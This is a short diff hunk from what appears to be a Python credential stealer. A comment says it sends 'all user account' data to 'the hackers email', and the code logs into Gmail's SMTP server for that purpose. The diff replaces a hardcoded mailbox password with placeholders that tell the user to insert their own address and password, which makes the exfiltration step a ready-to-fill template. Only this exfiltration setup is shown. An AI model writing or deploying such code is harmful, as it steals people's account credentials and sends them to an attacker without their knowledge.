@@ -70,8 +70,8 @@ while True:
 DEVNULL = open(os.devnull, 'wb')
 
 #sending all user account to the hackers email
-mail = "dummyd054@gmail.com"
-password = "1234dummy,"
+mail = "dummyd054@gmail.com" #replace with your email address
+password = "xxxxxxx" #type your password
 server = smtplib.SMTP("smtp.gmail.com", 587)
 server.starttls()
 server.login(mail, password)
